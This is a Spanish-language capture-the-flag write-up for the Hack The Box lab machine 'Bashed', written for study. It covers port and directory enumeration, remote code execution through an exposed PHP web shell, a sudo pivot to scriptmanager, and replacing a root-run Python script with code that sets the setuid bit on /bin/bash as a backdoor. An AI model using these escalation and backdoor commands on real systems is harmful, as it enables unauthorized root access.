# Bashed ![Avatar](https://www.hackthebox.eu/storage/avatars/0f058b73659ca043de9f5240abd651ca_thumb.png)

## Initial Scan
```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

## Enum
### HTTP
#### Gobuster
```
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/dev (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/php (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```
#### Dev
En /dev tenemos la shell de la que se habla en la main page, con ella tenemos un RCE con el que podemos obtener una shell directamente, en concreto yo use el comando para invocarla usanda python

## Privesc 
### Scriptmanager
```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
Con esto podemos escalar de manera sencilla en horizontal hacia scriptmanager con simplemente usar el siguiente comando
```
sudo -u scriptmanager /bin/bash
```
### Root
En / tenemos un directorio pertenciente a nuestro usuario actual
```
drwxrwxr--   2 scriptmanager scriptmanager  4096 Aug 21 18:52 scripts
```
En el tenemos dos archivos un test.txt y un test.py, el test.txt esta owned por el root, lo que me lleva a pensar que se ha ejecutado como root con ps aux lo confirmamos
```
root      16264  0.0  0.9  34220  9100 ?        S    12:18   0:00 python test.py
```
Sutituyamoslo por lo siguiente
```
import os
os.system("chmod +s /bin/bash")
```
Y al poco tendremos una backdoor como root
```
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 bash
scriptmanager@bashed:/bin$ /bin/bash -p
bash-4.3# id
``` 
Y ya estaria

# Analisís de la intrusión
### RCE
En /dev tenemos un script php diseñado directamente para tener RCE en el servidor, con el obtenemos el acceso incial
### Execution as scriptmanager
Desde www-data podemos ejecutar comandos como scriptmanger lo que nos permite comprometer a ese usuario totalmente
### Privileged script execution
La carpeta scripts en la que podemos añadir o modificar scripts a nuestro antojo se ejecuta entera como root de modo que podemos ejecutar cualquier tipo de comando mediante la libreria de python os


